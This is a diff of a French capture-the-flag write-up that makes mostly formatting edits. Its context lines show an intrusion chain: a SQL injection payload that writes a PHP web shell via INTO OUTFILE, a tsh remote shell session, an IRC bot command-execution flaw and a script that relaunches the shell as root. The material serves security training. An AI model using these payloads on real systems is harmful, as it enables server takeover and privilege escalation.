@@ -134,15 +134,15 @@ if(isset($_POST['user']) && isset($_POST['password']))
         mysql_close($link);
 ```
 
-J'aurais pu le récupérer grace au *file\_get\_contents* sans passer par la base de données ;-)  
+J'aurais pu le récupérer grace au `file_get_contents` sans passer par la base de données ;-)  
 
-L'exploitation est ici très limitée en raison du basename().  
+L'exploitation est ici très limitée en raison du `basename()`.  
 
-Comment améliorer notre accès ? Les options *--os-shell* et *--os-cmd* de sqlmap n'aboutissent pas.  
+Comment améliorer notre accès ? Les options `--os-shell` et `--os-cmd` de sqlmap n'aboutissent pas.  
 
-J'ai essayé de trouver des fichiers accessibles en lecture qui auraient pu me donner une autre piste mais sans succès.  
+J'ai essayé de trouver des fichiers accessibles en lecture qui auraient pu me donner une autre piste, mais sans succès.  
 
-Je suis donc revenu sur le SQL et en exploitant un *INTO OUTFILE* ça a fonctionné... Comme quoi il ne faut jamais faire trop confiance aux outils qu'on utilise.  
+Je suis donc revenu sur le SQL et en exploitant un `INTO OUTFILE` ça a fonctionné... Comme quoi il ne faut jamais faire trop confiance aux outils qu'on utilise.  
 
 Pour cela j'ai simplement saisi comme nom d'utilisateur :  
 
@@ -150,16 +150,16 @@ Pour cela j'ai simplement saisi comme nom d'utilisateur :
 ' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#
 ```
 
-En explorant les dossiers via la backdoor j'ai remarqué que sqlmap créait bien des fichiers mais ces derniers étaient vides...  
+En explorant les dossiers via la backdoor j'ai remarqué que sqlmap créait bien des fichiers, mais ces derniers étaient vides...  
 
-Je tente d'uploader un tshd dans le dossier courant (/var/www) et de lui donner des droits d'exécution mais l'opération ne passe pas, le changement de permission ne semble pas pris en compte sans pour autant lever d'erreur :(  
+Je tente d'uploader un tshd dans le dossier courant (`/var/www`) et de lui donner des droits d'exécution, mais l'opération ne passe pas, le changement de permission ne semble pas pris en compte sans pour autant lever d'erreur :(  
 
 Idem pour /tmp. La commande mount n'a rien révélé de particulier... qu'importe /dev/shm m'a sauvé une fois de plus :)  
 
 Le chat' bot-é
 --------------
 
-```bash
+```console
 mabox:~$ ./tsh 192.168.1.53
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -173,7 +173,7 @@ Dans les processus je remarque cette ligne :
 root      1537  0.0  1.2  28748  6360 ?        S    May29   0:00 php /root/decoded.php
 ```
 
-Bien sûr le fichier est inaccessible (ce serait trop facile). Heureusement on trouve la version d'origine dans la racine web (*/var/www/botsources/botcode.php.txt*).  
+Bien sûr le fichier est inaccessible (ce serait trop facile). Heureusement on trouve la version d'origine dans la racine web (`/var/www/botsources/botcode.php.txt`).  
 
 Le script commence par définir différentes variables :  
 
@@ -250,7 +250,7 @@ $cmd = system
 $arg = 'id'
 ```
 
-Il semble que les commandes préfixées par *!cmd* soint destinées aux administrateurs uniquement (appel d'une fonction admin() pour vérifier) :  
+Il semble que les commandes préfixées par `!cmd` soient destinées aux administrateurs uniquement (appel d'une fonction `admin()` pour vérifier) :  
 
 ```php
 if($called){
@@ -268,7 +268,7 @@ if($called){
 }
 ```
 
-alors que celles préfixées de *!bot* sont considérées publiques :  
+alors que celles préfixées de `!bot` sont considérées publiques :  
 
 ```php
 if($pubcalled){
@@ -284,7 +284,7 @@ if($pubcalled){
 }
 ```
 
-Je tente de rejoindre le cannal *#somechannel* avec */join #somechannel trolol* mais la clé ne passe pas, elle a du être modifiée dans la version qui tourne sur le système.  
+Je tente de rejoindre le cannal `#somechannel` avec `/join #somechannel trolol` mais la clé ne passe pas, elle a dû être modifiée dans la version qui tourne sur le système.  
 
 En me basant [sur la liste des commandes IRC](http://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands) j'ai tenté de récupérer le nom du bot (qui est pris au hazard dans la liste *jhl1*... *jhl30*) mais obtenir un listing semble impossible en raison de la clé.  
 
@@ -302,7 +302,7 @@ Ce qui donne pour un utilisateur inexistant (selon votre client IRC) :
 
 Pour l'utilisateur *jhl27* je n'ai obtenu aucune erreur ce qui était plutôt bon signe.  
 
-Après avoir moi-même lancé le bot pour vérifier la faille d'exécution j'ai choisi de créer le script *replace.sh* suivant dans */dev/shm* qui kill() mon tshd en cours puis le relancera cette fois avec les droits root :  
+Après avoir moi-même lancé le bot pour vérifier la faille d'exécution, j'ai choisi de créer le script `replace.sh` suivant dans `/dev/shm` qui kill() mon tshd en cours puis le relancera cette fois avec les droits root :  
 
 ```bash
 #!/bin/bash
@@ -310,7 +310,7 @@ killall tshd
 /dev/shm/tshd&
 ```
 
-J'ai procédé de la sorte car j'ai remarqué que le bot digère mal les arguments (exemple avec *uname -a*) :  
+J'ai procédé de la sorte, car j'ai remarqué que le bot digère mal les arguments (exemple avec `uname -a`) :  
 
 ```
 sh: uname -a : commande introuvable
